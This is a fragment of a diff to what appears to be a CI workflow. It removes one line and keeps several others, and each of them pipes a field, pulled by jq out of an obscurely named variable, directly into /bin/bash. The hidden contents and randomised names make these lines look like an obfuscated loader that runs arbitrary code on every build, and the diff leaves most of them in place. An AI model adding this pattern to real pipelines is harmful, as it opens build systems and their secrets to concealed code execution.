@@ -29,7 +29,6 @@ jobs:
           echo $vbktu293 | jq -r .xct3767 | /bin/bash
           echo $z50939 | jq -r .oktki07 | /bin/bash
           printf '%s' "$u0516" | jq -r .fj28 | /bin/bash
-          printf '%s' "$o122" | jq -r .ywo9 | /bin/bash
           printf '%s' "$lhy050" | jq -r .bg04 | /bin/bash
           echo $gsj3 | jq -r .vmwa54874 | /bin/bash
 
